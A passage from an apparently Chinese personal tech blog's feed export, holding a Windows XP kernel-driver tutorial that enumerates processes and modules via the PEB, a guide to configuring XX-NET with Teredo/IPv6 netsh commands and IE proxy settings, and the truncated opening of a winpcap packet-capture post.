<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">NTKERNELAPI HANDLE <span class="hljs-title">PsGetProcessInheritedFromUniqueProcessId</span><span class="hljs-params">(IN PEPROCESS Process)</span></span>;<br><span class="hljs-function">NTKERNELAPI  PPEB_EX  <span class="hljs-title">PsGetProcessPeb</span><span class="hljs-params">(PEPROCESS Process)</span></span>;<br><span class="hljs-function">NTKERNELAPI NTSTATUS <span class="hljs-title">PsLookupProcessByProcessId</span><span class="hljs-params">(HANDLE Id, PEPROCESS *Process)</span></span>;<br><span class="hljs-function">NTKERNELAPI NTSTATUS <span class="hljs-title">PsLookupThreadByThreadId</span><span class="hljs-params">(HANDLE Id, PETHREAD *Thread)</span></span>;<br><span class="hljs-function">NTKERNELAPI PEPROCESS <span class="hljs-title">IoThreadToProcess</span><span class="hljs-params">(PETHREAD Thread)</span></span>;<br><span class="hljs-comment">//NTKERNELAPI VOID NTAPI KeAttachProcess(PEPROCESS Process);</span><br><span class="hljs-comment">//NTKERNELAPI VOID NTAPI KeDetachProcess();</span><br><span class="hljs-comment">//NTKERNELAPI VOID NTAPI KeStackAttachProcess(PEPROCESS Process, PKAPC_STATE ApcState);</span><br><span class="hljs-comment">//NTKERNELAPI VOID NTAPI KeUnstackDetachProcess(PKAPC_STATE ApcState);</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>因为要通过 <code>PEPROCESS</code> 来获取进程和模块，所以还要用到几个结构体，在<strong>WinDbg</strong> 可看到。<br />
这里新建一个头文件，包含了PEB等信息</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;peb.h&quot;</span></span><br>如下：<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntifs.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB_LDR_DATA_EX</span></span><br><span class="hljs-class">&#123;</span><br>ULONG Length; <span class="hljs-comment">// +0x00  </span><br>BOOLEAN Initialized; <span class="hljs-comment">// +0x04  </span><br>PVOID SsHandle; <span class="hljs-comment">// +0x08  </span><br>LIST_ENTRY InLoadOrderModuleList; <span class="hljs-comment">// +0x0c </span><br>LIST_ENTRY InMemoryOrderModuleList; <span class="hljs-comment">// +0x14</span><br>LIST_ENTRY InInitializationOrderModuleList;<span class="hljs-comment">// +0x1c  </span><br>&#125;PEB_LDR_DATA_EX, *PPEB_LDR_DATA_EX;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LDR_DATA_TABLE_ENTRY_EX</span> &#123;</span><br>LIST_ENTRY InLoadOrderLinks;<br>LIST_ENTRY InMemoryOrderLinks;<br>LIST_ENTRY InInitializationOrderLinks;<br>PVOID DllBase;<br>PVOID EntryPoint;<br>ULONG SizeOfImage;<br>UNICODE_STRING FullDllName;<br>UNICODE_STRING BaseDllName;<br>ULONG Flags;<br>USHORT LoadCount;<br>USHORT TlsIndex;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>LIST_ENTRY HashLinks;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>PVOID SectionPointer;<br>ULONG CheckSum;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>ULONG TimeDateStamp;<br>PVOID LoadedImports;<br>&#125;;<br>PVOID EntryPointActivationContext;      <br>PVOID PatchInformation;<br>LIST_ENTRY ForwarderLinks;<br>LIST_ENTRY ServiceTagLinks;<br>LIST_ENTRY StaticLinks;<br>PVOID ContextInformation;<br>PVOID OriginalBase;<br>LARGE_INTEGER LoadTime;<br>&#125; LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CURDIR</span> &#123;</span><br>UNICODE_STRING DosPath;<br>PVOID Handle;<br>&#125;CURDIR, *PCURDIR;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">RTL_DRIVE_LETTER_CURDIR</span> &#123;</span><br>USHORT Flags;<br>USHORT Length;<br>ULONG TimeStamp;<br>STRING DosPath;<br>&#125;RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;<br><span class="hljs-comment">//进程参数</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">RTL_USER_PROCESS_PARAMETERS</span>&#123;</span><br>ULONG MaximumLength;<br>ULONG Length;<br>ULONG Flags;<br>ULONG DebugFlags;<br>PVOID ConsoleHandle;<br>ULONG ConsoleFlags;<br>PVOID StandardInput;<br>PVOID StandardOutput;<br>PVOID StandardError;<br>CURDIR CurrentDirectory;<br>UNICODE_STRING DllPath;<br>UNICODE_STRING ImagePathName;<br>UNICODE_STRING CommandLine;<br>PVOID Environment;<br>ULONG StartingX;<br>ULONG StartingY;<br>ULONG CountX;<br>ULONG CountY;<br>ULONG CountCharsX;<br>ULONG CountCharsY;<br>ULONG FillAttribute;<br>ULONG WindowFlags;<br>ULONG ShowWindowFlags;<br>UNICODE_STRING WindowTitle;<br>UNICODE_STRING DesktopInfo;<br>UNICODE_STRING ShellInfo;<br>UNICODE_STRING RuntimeData;<br>RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span class="hljs-number">32</span>];<br>&#125;RTL_USER_PROCESS_PARAMETERS,*PRTL_USER_PROCESS_PARAMETERS;<br><span class="hljs-comment">//进程环境块（因为Windows内核有一个机构PEB，为了不重定义，所以就另起一个名字）</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB_EX</span> &#123;</span><br>UCHAR InheritedAddressSpace;<br>UCHAR ReadImageFileExecOptions;<br>UCHAR BeingDebugged;<br>UCHAR SpareBool;<br>PVOID Mutant;<br>PVOID ImageBaseAddress;<br>PPEB_LDR_DATA_EX Ldr;<br>PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;<br>UCHAR Reserved4[<span class="hljs-number">104</span>];<br>PVOID Reserved5[<span class="hljs-number">52</span>];<br>PVOID PostProcessInitRoutine;<br>PVOID Reserved7;<br>UCHAR Reserved6[<span class="hljs-number">128</span>];<br>ULONG SessionId;<br>&#125; PEB_EX, *PPEB_EX;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>用于遍历进程函数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EnumProcess</span><span class="hljs-params">(PEPROCESS eprocess)</span></span><br><span class="hljs-function"></span>&#123;<br>	KAPC_STATE ks;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">MmIsAddressValid</span>(eprocess))<br>	<span class="hljs-keyword">return</span>;<br>	<span class="hljs-comment">//获取 PEB信息</span><br>	PPEB_EX peb = <span class="hljs-built_in">PsGetProcessPeb</span>(eprocess);<br>	<span class="hljs-keyword">if</span> (!peb)<br>		<span class="hljs-keyword">return</span>;<br>	<span class="hljs-comment">//依附进程!!!!!!!!!!!!!!</span><br>	<span class="hljs-built_in">KeStackAttachProcess</span>(eprocess, &amp;ks);<br>	__try<br>	&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">PsGetProcessId</span>(eprocess)!=<span class="hljs-number">0</span>)<br>		&#123;<br>		<span class="hljs-comment">//获取 进程参数</span><br>		PRTL_USER_PROCESS_PARAMETERS rtl_user_process_param = <br>(PRTL_USER_PROCESS_PARAMETERS)peb-&gt;ProcessParameters;<br>		<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;CommandLine:%wZ\n&quot;</span>, &amp;rtl_user_process_param-&gt;CommandLine);<br>		<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;ImagePath=%wZ\n&quot;</span>, &amp;rtl_user_process_param-&gt;ImagePathName);<br>		<span class="hljs-comment">//DbgPrint(&quot;Window Title=%wZ\n&quot;, &amp;rtl_user_process_param-&gt;WindowTitle);</span><br>		<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;——————————————————————————————&quot;</span>);<br>		&#125;<br>	&#125;<br>	__except (EXCEPTION_EXECUTE_HANDLER)<br>	&#123;<br>		<span class="hljs-comment">//DbgPrint(&quot;Can not Process...&quot;);</span><br>	&#125;<br>	<span class="hljs-comment">//取消依附进程</span><br>	<span class="hljs-built_in">KeUnstackDetachProcess</span>(&amp;ks);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>遍历模块，大体上和遍历进程一样，但也要注意区别</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EnumModules</span><span class="hljs-params">(PEPROCESS eprocess)</span></span><br><span class="hljs-function"></span>&#123;<br>	KAPC_STATE ks;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">MmIsAddressValid</span>(eprocess))<br>		<span class="hljs-keyword">return</span>;<br>	<span class="hljs-comment">//获取 PEB信息</span><br>	PPEB_EX peb = <span class="hljs-built_in">PsGetProcessPeb</span>(eprocess);<br>	<span class="hljs-keyword">if</span> (!peb)<br>		<span class="hljs-keyword">return</span>;<br>	<span class="hljs-comment">//依附进程!!!!!!!!!!!!!!</span><br>	<span class="hljs-built_in">KeStackAttachProcess</span>(eprocess, &amp;ks);<br>	__try<br>	&#123;<br>		PPEB_LDR_DATA_EX peb_LDR_data = (PPEB_LDR_DATA_EX)peb-&gt;Ldr;<br>		PLIST_ENTRY list_entry = &amp;peb_LDR_data-&gt;InLoadOrderModuleList;<br>		<span class="hljs-comment">//先获取第一个</span><br>		PLIST_ENTRY currentList = list_entry-&gt;Flink;<br>		<span class="hljs-keyword">while</span> (currentList!=list_entry)<br>		&#123;<br>		PLDR_DATA_TABLE_ENTRY_EX ldr_data_table_entry =(PLDR_DATA_TABLE_ENTRY_EX)currentList;<br>		<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;Module Base=%p DllPath=%wZ\n&quot;</span>,ldr_data_table_entry-&gt;DllBase, &amp;ldr_data_table_entry-&gt;FullDllName);<br>		<span class="hljs-comment">//指向下一个</span><br>		currentList = currentList-&gt;Flink;<br>		&#125;<br>	&#125;<br>	__except (EXCEPTION_EXECUTE_HANDLER)<br>	&#123;<br>		<span class="hljs-comment">//DbgPrint(&quot;Can not Modules...&quot;);</span><br>	&#125;<br>	<span class="hljs-comment">//取消依附进程</span><br>	<span class="hljs-built_in">KeUnstackDetachProcess</span>(&amp;ks);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>这个函数把上面两个函数整合在一起了</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">EnumProcessModuleInformations</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//第一个进程环境块</span><br>	PEPROCESS eprocess=<span class="hljs-built_in">PsGetCurrentProcess</span>();<br>	PEPROCESS eprocess_first = eprocess;<br>	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>	&#123;<br>		<span class="hljs-comment">//获取进程</span><br>		<span class="hljs-built_in">EnumProcess</span>(eprocess);<br>		<span class="hljs-comment">//下一个进程，我获取的是WinXP的 EPROCESS !</span><br>		eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + <span class="hljs-number">0x88</span>) - <span class="hljs-number">0x88</span>);<br>		<span class="hljs-keyword">if</span> (eprocess == eprocess_first)&#123;<span class="hljs-keyword">break</span>;&#125;<br>	&#125;<br>	eprocess= eprocess_first;<br>	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>	&#123;<br>		<span class="hljs-comment">//获取模块</span><br>		<span class="hljs-built_in">EnumModules</span>(eprocess);<br>		<span class="hljs-comment">//下一个进程</span><br>		eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + <span class="hljs-number">0x88</span>) - <span class="hljs-number">0x88</span>);<br>		<span class="hljs-keyword">if</span> (eprocess == eprocess_first)&#123;<span class="hljs-keyword">break</span>;&#125;<br>	&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>卸载函数很简单</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">unload</span><span class="hljs-params">(PDRIVER_OBJECT p)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;UnloadDriver...&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>驱动入口函数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT pDriver_Obj, PUNICODE_STRING pRegisterPath)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;DriverEntry...&quot;</span>);<br>	pDriver_Obj-&gt;DriverUnload = unload;<br>	<span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;DriverName:%wZ RegisterPath:%wZ \n &quot;</span>, &amp;pDriver_Obj-&gt;DriverName,pRegisterPath);<br>	<span class="hljs-comment">//这里调用</span><br>	<span class="hljs-built_in">EnumProcessModuleInformations</span>();<br>	<span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XX-NET使用</title>
    <url>/windows-xxnet/</url>
    <content><![CDATA[<p>本章讲述Windows下怎么快速的搭建FQ环境,同样是用XX-NET<br />
同样的,还是到github获取xx-net.<br />
本文的重点是在Windows上开始 <strong>IPv6</strong> .<br />
在未开启ipv6首次打开xx-net时,会显示 <strong>尚未建立连接</strong>.</p>
<span id="more"></span>
<p><font color=green>PS： 以下方法可能比较旧，目前我使用的是X-Tunnel</font></p>
<h4 id="开启ipv6"><a class="markdownIt-Anchor" href="#开启ipv6"></a> 开启ipv6</h4>
<p>直接在 <strong>cmd命令提示符</strong> 下输入一下命令</p>
<figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf">//teredo服务器：teredo-debian.remlab.net<br>netsh interface teredo <span class="hljs-built_in">set</span> <span class="hljs-keyword">state</span> server=teredo-debian.remlab.net<br>netsh int ter <span class="hljs-built_in">set</span> <span class="hljs-keyword">state</span> enterpriseclient<br>netsh int ipv6 show teredo	//查看状态<br></code></pre></div></td></tr></table></figure>
<blockquote>
<p>Teredo 参数<br />
-——————————————–<br />
类型 : enterpriseclient<br />
服务器名称 : <a href="http://teredo-debian.remlab.net">teredo-debian.remlab.net</a><br />
客户端刷新间隔 : 30 秒<br />
客户端端口 : unspecified<br />
状态 : qualified<br />
客户端类型 : teredo client<br />
网络 : unmanaged<br />
NAT : restricted<br />
NAT 特殊行为 : UPNP: 是，PortPreserving: 否<br />
本地映射 : 192.168.1.103:64530<br />
外部 NAT 映射 : <a href="http://xxx.xxx.xxx.xxx:23441">xxx.xxx.xxx.xxx:23441</a></p>
</blockquote>
<p><img src="/uploads/images/win_vpn/file_013.png" alt="img" /></p>
<h4 id="恢复teredo"><a class="markdownIt-Anchor" href="#恢复teredo"></a> 恢复teredo</h4>
<p>断开连接的话,可以直接 <strong>退出</strong> xx-net,还需在cmd下输入一下命令即可</p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-comment">//恢复teredo</span><br>netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">teredo</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">state</span> <span class="hljs-symbol">default</span> <span class="hljs-symbol">server</span>=<span class="hljs-symbol">default</span><br><span class="hljs-symbol">netsh</span> <span class="hljs-symbol">int</span> <span class="hljs-symbol">ipv6</span> <span class="hljs-symbol">show</span> <span class="hljs-symbol">teredo</span> //查看状态<br></code></pre></div></td></tr></table></figure>
<blockquote>
<p>Teredo 参数<br />
-—————————————–<br />
类型 : client<br />
服务器名称 : teredo.ipv6.micr<br />
客户端刷新间隔 : 30 秒<br />
客户端端口 : unspecified<br />
状态 : offline<br />
错误 : 未能解析服务器名</p>
</blockquote>
<h4 id="ie浏览器代理设置"><a class="markdownIt-Anchor" href="#ie浏览器代理设置"></a> IE浏览器代理设置</h4>
<p><img src="/uploads/images/win_vpn/file_017.png" alt="img" /></p>
<p>默认情况下,IE浏览器时没有设置代理,所以也就无法访问一些网站.这里介绍两种方法</p>
<h5 id="internet选项lan设置"><a class="markdownIt-Anchor" href="#internet选项lan设置"></a> Internet选项(LAN)设置</h5>
<p>打开IE浏览器&gt;&gt;Internet选项&gt;&gt;连接&gt;&gt;<strong>局域网(LAN)设置</strong>,之后 勾选 代理服务器之一,并填入 <strong>地址</strong> 和 <strong>端口</strong> ,其中地址默认 <code>127.0.0.1</code> ,端口可以从 GAEProxy状态信息 &gt;&gt; 配置 属性里的 <strong>监听代理</strong> 为 <code>8087</code></p>
<p><img src="/uploads/images/win_vpn/file_015.png" alt="img" /><br />
<img src="/uploads/images/win_vpn/file_016.png" alt="img" /></p>
<h5 id="花刺代理proxythorn"><a class="markdownIt-Anchor" href="#花刺代理proxythorn"></a> 花刺代理(ProxyThorn)</h5>
<p>添加代理<br />
<img src="/uploads/images/win_vpn/file_018.png" alt="img" /></p>
<p>填入gae的服务器地址以及端口<br />
<img src="/uploads/images/win_vpn/file_019.png" alt="img" /></p>
<p>先验证再设为IE代理<br />
<img src="/uploads/images/win_vpn/file_020.png" alt="img" /></p>
<p>然后在次刷新IE浏览器即可再次看到Google主页!</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>利用winpcap获取网络数据传输</title>
    <url>/winpcap-use/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<blockquote>
<p><strong>winpcap</strong>(windows packet capture)是windows平台下一个免费，公共的网络访问系统。开发winpcap这个项目的目的在于为win32应用程序提供访问网络底层的能力。它用于windows系统下的直接的网络编程。</p>
<p><strong>驱动功能</strong><br />
捕获原始数据包，包括在共享网络上各主机发送/接收的以及相互之间交换的数据包；<br />
在数据包发往应用程序之前，按照自定义的规则将某些特殊的数据包过滤掉；<br />
在网络上发送原始的数据包；<br />
收集网络通信过程中的统计信息。</p>
</blockquote>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>在使用之前，可以到winpcap官网下载安装</p>
<p>代码说明一切</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span 